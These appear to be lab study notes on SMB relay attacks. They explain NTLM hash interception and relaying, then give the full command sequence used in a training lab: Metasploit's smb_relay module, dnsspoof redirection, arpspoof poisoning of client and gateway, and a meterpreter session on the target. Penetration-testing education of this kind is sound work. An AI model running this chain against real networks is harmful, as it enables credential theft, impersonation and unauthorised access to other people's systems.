SMB Relay Attack
- An SMB relay attack is a type of network attack where an attacker intercepts SMB (Server Message Block) traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious activities.
- This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services

How SMB Relay Attacks Work
- Interception: The attacker sets up a man-in-the-middle position between the client and the server. This can be done using various techniques, such as ARP spoofing, DNS poisoning, or setting up a rogue SMB server.
- Capturing Authentication: When a client connects to a legitimate server via SMB, it send authentication data. The attacker captures this data, which might include NTLM (NT LAN Manager) hashes.
- Replying to a Legitimate Server: Instead of decrypting the captured NTLM hash, the attacker relays it to another server that trusts the source. This allows the attacker to impersonate the user whose hash was captured.
- Gain Access: If the relay is successful, the attacker can gain access to the resources on the server, which might include sensitive files, databases, or administrative privileges. This access could lead to further lateral movement within the network, compromising additional systems.

- Setting up SMB Relay using Metasploit Framework
	- `ifconfig`
	- `msfconsole`
	- `search smb_relay`
	- `use exploit/windows/smb/smb_relay`
	- `show options`
	- `set SRVHOST 172.16.5.101`
	- `set LHOST 172.16.5.101`
	- `set SMBHOST 172.16.5.10`
	- `exploit`
	- `jobs`
- Setting up DNS Spoofing using DNS Spoof, on a new terminal (To redirect SMB connection requests to our attack machine, whenever there is a SMB connection to any host in the domain, which in this scenario is `*.sportsfoo.com`)
	- `echo "172.16.5.101 *.sportsfoo.com" > dns`
	- `dnsspoof -i eth1 -f dns`
- Enabling IPv4 Port Forwarding, for ARP spoofing to work:
	- `echo 1 > /proc/sys/net/ipv4/ip_forward`
- Now we will set up ARP spoofing to spoof our attack machine as the default gateway for the network, this needs to be done to intercept the traffic being sent between the client machine and the default gateway.
	- Each command given below need to be done on a new terminal, or in the background, since these need to run simultaneously.
	- `arpspoof -i eth1 -t 172.16.5.5 172.16.5.1`
	- `arpspoof -i eth1 -t 172.16.5.1 172.16.5.5`
- Since the client is set to send requests to `fileserver.sportsfoo.com` every 30 seconds, we should now eventually see an entry pop up on the terminal where we ran `dnsspoof`.
- Following this, we will see that once our meterpreter exploit finds an SMB request being sent our way by the client machine, it automatically proceeds to perform the SMB Relay attack, which should have completed successfully at this point.
- Whenever the `smb_relay` module receives an incoming SMB connection, it intercepts the NTLM hash, and automatically uses it to get a shell or meterpreter session to the target SMB server (SMBHOST).
- `sessions 1`
- Meterpreter Session:
	- `getuid`
	- `sysinfo`
